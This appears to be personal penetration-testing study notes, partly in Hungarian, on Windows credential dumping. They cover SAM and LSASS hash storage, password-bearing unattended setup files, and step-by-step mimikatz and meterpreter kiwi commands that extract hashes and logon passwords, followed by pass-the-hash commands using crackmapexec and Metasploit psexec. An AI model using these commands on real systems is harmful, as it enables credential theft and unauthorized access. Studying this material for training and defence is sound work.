# win credential dumping
## important info
Dumping hashes on Windows is need elevated privileges (admin privileges) !!!!!!
## windows password hashes
* location
  * SAM (Security Accounts Manager) database
* auth and verify creds
  * LSA (Local Security Authority)
* hash types
  * Windows Server 2003 (and before)
    * LM, NTLM
  * Windows Vista (and later)
    * just NTLM hash (or NT hash)
* NTLM versions
  * NTLMv1
  * NTLMv2
* SAM
  * SAM database file can not be copied while OS is running
  * thats why we usually dump it from in-memory places (like LSASS)
  * in modern versions of windows, SAM database is encrypted with a syskey
  * admin priv needed to intercat with LSASS process
* LM hash
 * kb mar sehol se talalkozunk vele
 * ha megis, akkor nagyon konnyen torheto
* NTLM hash (NT hash)
 * authentikaciora hasznaljak, username + password kell az authoz
 * md4 hash-el vannak titkositva
 * konnyen torhetok
## passwords, credentials in win config files
* Unattended windows setup utility
  * mass installation on multiple systems
  * after setup sometimes conf files are remaining with user creds or admin creds
  * deletion of config files have to be done manually by the sys admins (of course they sometimes forget it)
  * locations
    * C:\Windows\Panther\Unattend.xml
    * C:\Windows\Panther\Autounattend.xml
  * a jelszo lehet hogy base64 encoded
  * ha meg van a jelszo, akkor azzal lehet authentikalni pl psexec-el
## hash dumping with mimikatz
* post exploitation tool
* functions
  * extract plain text passwords, hashes and kerberos tickets from memory (lsass)
  * pass the hash, pass the ticket, build golden ticket
* need elevated privileges to run correctly (admin or system)
* run methods
  * download and run the binary
  * (compile from source)
  * use meterpreter kiwi extension (need live meterpreter session)
* dump hashes with metasploit kiwi module
  * (we got admin priv)
  * meterpreter> pgrep lsass
  * meterpreter> migrate <pid>
  * meterpreter> load kiwi
  * meterpreter> lsa_dump_sam     //dump all ntlm hashes for all user accounts
  * meterpreter> creds_all        //dump all credentials
  * meterpreter> lsa_dump_secrets //neha ad clear text credential-eket
  * meterpreter> password_change  //change the password / hash of a user
* dump hashes with native mimikatz binary
  * meterpreter> upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
  * (victim machine) C:\Temp> .\mimikatz.exe
  * (victim machine) mimikatz # privilege::debug    //check if enough privilege we got to do hash dump
  * (victim machine) mimikatz # lsadump::sam        //dump ntlm hashes (and lots of other info)
  * (victim machine) mimikatz # lsadump::secrets    //dump secrets
  * (victim machine) mimikatz # sekurlsa::logonpasswords    //display logon passwords (if system store logon passwords)
## pass the hash
* collecting plain text passwords and hashes and utilizing them to authenticate with via smb
### solution 1
* meterpreter> load kiwi
* meterpreter> lsa_dump_sam   //dump nt hashes
* crackmapexec smb 10.10.10.1 -u Administrator -H "<nt_hash>"
* crackmapexec smb 10.10.10.1 -u Administrator -H "<nt_hash>" -x "whoami"
### solution 2
* meterpreter> hashdump       //dump lm + nt hashes
* use exploit/windows/smb/ps_exec
* set SMBUser Administrator
* set SMBPass <lm_hash>:<nt_hash>
* set target Native\ upload
* run
